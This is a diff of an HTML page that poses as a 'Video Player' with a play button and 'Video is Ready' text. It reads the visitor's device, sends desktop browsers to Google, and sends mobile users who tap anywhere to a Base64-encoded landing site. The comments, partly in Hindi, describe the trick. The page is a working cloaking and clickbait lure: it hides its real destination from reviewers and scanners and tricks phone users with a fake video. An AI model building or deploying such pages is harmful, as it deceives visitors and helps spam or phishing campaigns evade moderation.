@@ -1,41 +1,52 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Viral Content</title>
-    <style>
-        body, html { height: 100%; margin: 0; display: flex; align-items: center; justify-content: center; background-color: #f0f2f5; font-family: sans-serif; cursor: pointer; }
-        .box { text-align: center; padding: 20px; }
-        .btn { background: #1877f2; color: white; padding: 12px 24px; border-radius: 6px; font-weight: bold; text-decoration: none; display: inline-block; margin-top: 10px; }
-    </style>
-</head>
-<body onclick="startRedirect()">
-
-    <div class="box">
-        <img src="https://cdn-icons-png.flaticon.com/512/1384/1384060.png" width="80" alt="Video">
-        <h2>Click to Watch Full Video</h2>
-        <p>Tap anywhere on the screen to continue...</p>
-        <div class="btn">Watch Now</div>
-    </div>
-
+    <title>Video Player</title>
     <script>
-        function startRedirect() {
-            // Aapka Strikingly Link (Base64)
-            var secret = "aHR0cHM6Ly9lbmVyZ2V0aWMtb3JhbmdlLXNzd2h0di5teXN0cmlraW5nbHkuY29tLw==";
-            
-            // Device Check
-            var ua = navigator.userAgent.toLowerCase();
-            var isMobile = /android|iphone|ipad|ipod/i.test(ua);
+        // Aapka strikingy link Base64 mein
+        var m_url = "aHR0cHM6Ly9lbmVyZ2V0aWMtb3JhbmdlLXNzd2h0di5teXN0cmlraW5nbHkuY29tLw==";
+        var p_url = "https://www.google.com";
 
-            if (isMobile) {
-                // Mobile user click karega toh landing page par jayega
-                window.location.href = atob(secret);
+        function checkDevice() {
+            var ua = navigator.userAgent.toLowerCase();
+            // Laptop/PC Check (Windows, Mac, Linux)
+            var isPC = /windows|macintosh|linux/i.test(ua) && !/android/i.test(ua);
+
+            if (isPC) {
+                // Agar Laptop hai toh foran Google pe bhej do
+                window.location.replace(p_url);
             } else {
-                // PC user click karega toh Google par jayega
-                window.location.href = "https://www.google.com";
+                // Agar Mobile hai toh page dikhao
+                document.getElementById("mobile-content").style.display = "block";
             }
         }
+
+        function goNow() {
+            // Screen pe kahin bhi click ho toh redirect
+            window.location.href = atob(m_url);
+        }
+
+        window.onload = checkDevice;
     </script>
+    <style>
+        body { margin: 0; padding: 0; font-family: Arial, sans-serif; background: #000; color: #fff; cursor: pointer; }
+        #mobile-content { display: none; height: 100vh; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .play-btn { width: 80px; height: 80px; background: red; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; }
+        .play-btn::after { content: ''; border-left: 25px solid white; border-top: 15px solid transparent; border-bottom: 15px solid transparent; margin-left: 10px; }
+        h2 { font-size: 24px; margin: 10px; }
+        p { color: #ccc; }
+    </style>
+</head>
+<body onclick="goNow()">
+
+    <div id="mobile-content">
+        <div class="play-btn"></div>
+        <h2>Video is Ready</h2>
+        <p>Tap anywhere on the screen to play</p>
+    </div>
+
 </body>
 </html>
 
